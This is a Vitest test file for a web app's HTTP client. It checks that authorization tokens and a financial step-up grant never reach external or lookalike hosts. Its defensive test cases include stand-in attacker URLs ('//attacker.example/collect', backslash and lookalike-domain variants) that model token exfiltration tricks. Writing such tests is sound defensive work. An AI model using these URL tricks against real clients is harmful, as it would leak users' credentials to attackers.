import { beforeEach, describe, expect, it, vi } from "vitest";
import axios from "axios";
import { apiClient, publicHttpClient } from "@/services/apiClient";
import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { clearFinancialStepUp, storeFinancialStepUp } from "@/services/securityStepUp";

vi.mock("@/services/apiErrors", () => ({
  normalizeApiError: (error: unknown) => error,
  handleAuthError: vi.fn(),
}));

describe("HTTP client authorization boundaries", () => {
  beforeEach(() => {
    clearFinancialStepUp();
    vi.restoreAllMocks();
    vi.stubEnv("VITE_API_URL", "https://api.xeler.test/api");
    sessionStorage.setItem("token", "private-token");
    vi.spyOn(axios, "request").mockResolvedValue({ data: {} });
  });

  it("attaches authorization to relative and official absolute API URLs", async () => {
    await apiClient.get("user");
    await apiClient.get("https://api.xeler.test/api/orders");

    const calls = vi.mocked(axios.request).mock.calls;
    expect(calls[0][0]?.headers).toMatchObject({
      Authorization: "Bearer private-token",
    });
    expect(calls[1][0]?.headers).toMatchObject({
      Authorization: "Bearer private-token",
    });
  });

  it("never sends authorization to Coinbase or any external destination", async () => {
    await apiClient.get("https://api.coinbase.com/v2/prices/BTC-USD/spot");
    await apiClient.get("collect", {
      baseURL: "https://attacker.example",
      headers: { Authorization: "Bearer caller-supplied" },
    });

    for (const [config] of vi.mocked(axios.request).mock.calls) {
      expect(config?.headers).not.toHaveProperty("Authorization");
    }
  });

  it("rejects protocol-relative, backslash and lookalike API destinations", async () => {
    const unsafeUrls = [
      "//attacker.example/collect",
      "\\\\attacker.example\\collect",
      "/\\attacker.example/collect",
      "\\/attacker.example/collect",
      "https://api.xeler.test.evil.example/api",
      "https://api.xeler.test/api-malicious",
      "https://attacker.example",
    ];

    for (const url of unsafeUrls) {
      await apiClient.get(url, {
        headers: { Authorization: "Bearer caller-supplied" },
      });
    }

    for (const [config] of vi.mocked(axios.request).mock.calls) {
      expect(config?.headers).not.toHaveProperty("Authorization");
    }
  });

  it("confirms Axios treats a double-slash URL as protocol-relative external", () => {
    const effectiveUrl = axios.getUri({
      baseURL: "https://api.xeler.test/api",
      url: "//attacker.example/collect",
    });
    const destination = new URL(effectiveUrl, "https://app.xeler.test");

    expect(destination.origin).toBe("https://attacker.example");
    expect(destination.origin).not.toBe("https://api.xeler.test");
  });

  it("public client never reads or forwards authorization", async () => {
    await publicHttpClient.get("https://ticker.xeler.io/v1/ticker", {
      headers: { authorization: "Bearer injected" },
    });

    const headers = vi.mocked(axios.request).mock.calls[0][0]
      ?.headers as Record<string, string>;
    expect(Object.keys(headers)).not.toContain("authorization");
    expect(Object.keys(headers)).not.toContain("Authorization");
  });

  it("attaches a financial grant once, only to an official sensitive request", async () => {
    storeFinancialStepUp("finance.financial_configuration", "opaque-step-up");
    await apiClient.post("admin/control-center", {}, { financialScope: "finance.financial_configuration" });
    await apiClient.post("admin/control-center", {}, { financialScope: "finance.financial_configuration" });

    const calls = vi.mocked(axios.request).mock.calls;
    expect(calls[0][0]?.headers).toMatchObject({ "X-Financial-Step-Up": "opaque-step-up" });
    expect(calls[1][0]?.headers).not.toHaveProperty("X-Financial-Step-Up");
  });

  it("never sends a queued financial grant to an external destination", async () => {
    storeFinancialStepUp("finance.xcop", "must-not-leak");
    await apiClient.post("https://attacker.example/collect", {}, { financialScope: "finance.xcop" });
    expect(vi.mocked(axios.request).mock.calls[0][0]?.headers).not.toHaveProperty("X-Financial-Step-Up");
  });

  it("WalletStore uses the same-origin ticker facade and FeesStore has no external API", () => {
    const wallet = readFileSync(
      resolve(process.cwd(), "src/stores/WalletStore.ts"),
      "utf8",
    );
    const ticker = readFileSync(
      resolve(process.cwd(), "src/services/tickerApi.ts"),
      "utf8",
    );
    const fees = readFileSync(
      resolve(process.cwd(), "src/stores/FeesStore.ts"),
      "utf8",
    );

    expect(wallet).toContain("tickerApi.getRates()");
    expect(ticker).toContain('apiClient.get<PublicTickerResponse>("public/ticker"');
    expect(fees).not.toContain("api.coinbase.com");
  });
});
